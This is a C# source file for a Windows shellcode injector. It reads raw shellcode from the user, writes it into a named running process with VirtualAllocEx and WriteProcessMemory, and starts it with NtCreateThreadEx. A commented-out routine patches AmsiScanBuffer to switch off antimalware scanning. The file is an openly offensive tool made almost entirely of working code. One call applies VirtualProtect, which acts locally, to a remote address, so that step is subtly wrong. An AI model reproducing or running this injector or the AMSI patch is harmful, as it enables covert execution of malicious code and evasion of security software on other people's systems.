using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(
        uint dwDesiredAccess,
        bool bInheritHandle,
        uint dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        int dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out int lpNumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern int NtCreateThreadEx(
        out IntPtr hThread,
        uint DesiredAddress,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartRoutine,
        IntPtr Argument,
        uint CreateFlags,
        IntPtr ZeroBits,
        IntPtr StackSize,
        IntPtr MaximumStackSize,
        IntPtr AttributeList);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    const uint PROCESS_VM_WRITE = 0x0020;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_CREATE_THREAD = 0x0002;
    const uint PROCESS_QUERY_INFORMATION = 0x0400;

    const uint THREAD_ACCESS_MASK = 0x0065;

    const uint MEM_COMMIT = 0x00001000;
    const uint MEM_RESERVE = 0x00002000;

    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint PAGE_EXECUTE_READ = 0x20;

    //static void patchAmsi()
    //{
    //    IntPtr amsi = LoadLibrary("amsi.dll");
    //    IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

    //    uint old;
    //    VirtualProtect(amsiScanBuffer, 6, 0x40, out old);

    //    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    //    Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);

    //    VirtualProtect(amsiScanBuffer, 6, old, out old);
    //}

    static byte[] LoadShellcode(string input)
    {
        input = input.Trim();

        if (input.StartsWith("0x"))
            return Convert.FromHexString(input.Substring(2));

        if (input.Contains('+') || input.Contains('/'))
            return Convert.FromBase64String(input);

        if (File.Exists(input))
            return File.ReadAllBytes(input);

        return Convert.FromHexString(input);
    }

    static void Main ()
    {
        try
        {
            // patchAmsi();

            Console.Write("Enter the process name (Write without the .exe extension): ");
            string processname = Console.ReadLine();

            Console.Write("Enter your hex/base64/path to bin file/ (check README.md): ");

            string input = Console.ReadLine().Replace(" ", "").Replace("\n", "").Replace("\r", "");
            byte[] code = LoadShellcode(input);

            Process[] procs = Process.GetProcessesByName(processname);
            if (procs.Length == 0)
            {
                Console.WriteLine("[!] Process is NOT running. Exiting....");
                return;
            }

            Process userprocess = procs[0];
            uint pid = (uint)userprocess.Id;

            int bytesWritten;

            IntPtr hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, false, pid);
            if (hProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] Insufficient rights. Run as administrator. Exiting....");
                return;
            }

            IntPtr AllocatedEx = VirtualAllocEx(hProcess, 0, code.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (AllocatedEx == IntPtr.Zero)
            {
                Console.WriteLine("[!] VirtualAllocEx Failed");
                CloseHandle(hProcess);
                return;
            }
            bool success = WriteProcessMemory(hProcess, AllocatedEx, code, code.Length, out bytesWritten);

            VirtualProtect(AllocatedEx, (uint)code.Length, PAGE_EXECUTE_READ, out uint oldProtect);

            IntPtr hThread;
            int status = NtCreateThreadEx(
                out hThread,
                THREAD_ACCESS_MASK,
                IntPtr.Zero,
                hProcess,
                AllocatedEx,
                IntPtr.Zero,
                0,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero);

            if (status != 0)
            {
                Console.WriteLine($"[-] NtCreateThreadEx failed. 0x{status:X}");
                CloseHandle(hProcess);
                return;
            }

            if (success)
            {
                Console.WriteLine("Success!");
                Console.WriteLine($"Written: {bytesWritten} bytes");
            }
            else
            {
                Console.WriteLine("[!] WriteProcessMemory failed.");
                CloseHandle(hProcess);
                CloseHandle(hThread);
                return;
            }

            CloseHandle(hProcess);
            CloseHandle(hThread);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"An unknown error has occurred: {ex}");
        }

        Console.WriteLine("Press any key to exit...");
        Console.ReadKey();
    }
}